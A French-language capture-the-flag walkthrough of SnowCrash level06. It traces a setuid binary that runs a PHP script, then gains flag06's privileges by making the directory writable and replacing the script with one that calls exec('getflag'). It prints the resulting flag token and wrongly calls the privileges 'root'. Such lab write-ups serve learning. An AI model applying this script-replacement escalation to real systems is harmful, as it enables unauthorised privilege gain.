# Level06

</br></br>

## ls -l

```sh
level06@SnowCrash:~$ ls -l
total 12
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
```

Les deux fichiers sont exécutables et lisibles
Dans le fichier level06, rws signifie lecture-écriture-exécution + setuid. Cela signifie que lorsque le fichier est exécuté, l'utilisateur exécutant a les privilèges du propriétaire du fichier (flag06). Ainsi, lorsque l'utilisateur level06 exécute le fichier level06, il aura les privilèges de l'utilisateur flag06 lors de son exécution.

</br></br>

## level06

```bash
level06@SnowCrash:~$ nm ./level06
08049f28 d _DYNAMIC
08049ff4 d _GLOBAL_OFFSET_TABLE_
080487cc R _IO_stdin_used
         w _Jv_RegisterClasses
08049f18 d __CTOR_END__
08049f14 d __CTOR_LIST__
08049f20 D __DTOR_END__
08049f1c d __DTOR_LIST__
08048a3c r __FRAME_END__
08049f24 d __JCR_END__
08049f24 d __JCR_LIST__
0804a02c A __bss_start
0804a024 D __data_start
08048780 t __do_global_ctors_aux
08048550 t __do_global_dtors_aux
0804a028 D __dso_handle
         w __gmon_start__
08048772 T __i686.get_pc_thunk.bx
08049f14 d __init_array_end
08049f14 d __init_array_start
08048770 T __libc_csu_fini
08048700 T __libc_csu_init
         U __libc_start_main@@GLIBC_2.0
0804a02c A _edata
0804a034 A _end
080487ac T _fini
080487c8 R _fp_hw
08048380 T _init
08048528 T _start
0804864e T afterSubstr
0804a02c b completed.6159
0804a024 W data_start
0804a030 b dtor_idx.6161
         U execve@@GLIBC_2.0
080485b0 t frame_dummy
         U free@@GLIBC_2.0
         U getegid@@GLIBC_2.0
         U geteuid@@GLIBC_2.0
0804867c T isLib
08048450 T main
         U setresgid@@GLIBC_2.0
         U setresuid@@GLIBC_2.0
         U strdup@@GLIBC_2.0
080485f3 T syscall_gets
080485d4 T syscall_open
level06@SnowCrash:~$ strace ./level06
...
...
mprotect(0xb7fcf000, 8192, PROT_READ)   = 0
mprotect(0x8049000, 4096, PROT_READ)    = 0
mprotect(0xb7ffe000, 4096, PROT_READ)   = 0
munmap(0xb7fd5000, 21440)               = 0
brk(0)                                  = 0x804b000
brk(0x806c000)                          = 0x806c000
getegid32()                             = 2006
geteuid32()                             = 2006
setresgid32(2006, 2006, 2006)           = 0
setresuid32(2006, 2006, 2006)           = 0
execve("/usr/bin/php", ["/usr/bin/php", "/home/user/level06/level06.php", "", ""], [/* 21 vars */]) = 0
...
...
```

level06 execute le fichier level06.php avec les privilèges root

ça doit être commancer

```sh
level06@SnowCrash:~$ chmod 777 .
level06@SnowCrash:~$ ls
level06  level06.php
level06@SnowCrash:~$ rm -rf level06.php
level06@SnowCrash:~$ ls
level06
level06@SnowCrash:~$ vim level06.php
level06@SnowCrash:~$ ls
level06  level06.php
level06@SnowCrash:~$ cat level06.php
#!/usr/bin/php

<?php
echo exec('getflag');
?>
level06@SnowCrash:~$ ./level06

Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
level06@SnowCrash:~$ su level07
Password:
```
